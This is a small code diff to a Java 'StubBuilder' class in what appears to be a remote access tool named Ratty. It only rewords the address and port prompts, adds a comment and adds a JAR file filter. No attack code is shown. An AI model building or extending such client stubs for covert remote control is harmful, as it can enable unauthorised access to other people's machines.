@@ -13,15 +13,19 @@ import java.nio.file.StandardCopyOption;
 
 import javax.swing.JFileChooser;
 import javax.swing.JOptionPane;
+import javax.swing.filechooser.FileNameExtensionFilter;
 
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.Ratty;
 
 
+/*
+ * This class is kinda hardcoded.
+ */
 public final class StubBuilder {
 	
-	private static final String ADDRESS_MESSAGE = "Address?";
-	private static final String PORT_MESSAGE = "Port?";
+	private static final String ADDRESS_MESSAGE = "Which address should the client connect to?";
+	private static final String PORT_MESSAGE = "Which port?";
 	
 	private static final String FILE_NAME = "/connection_data.txt";
 	
@@ -35,6 +39,7 @@ public final class StubBuilder {
 		final File currentDirectory = new File(currentDirectoryPath);
 		
 		fileChooser.setCurrentDirectory(currentDirectory);
+		fileChooser.setFileFilter(new FileNameExtensionFilter("*.jar", "JAR"));
 		
 		final int input = open ? fileChooser.showOpenDialog(null) : fileChooser.showSaveDialog(null);
 		
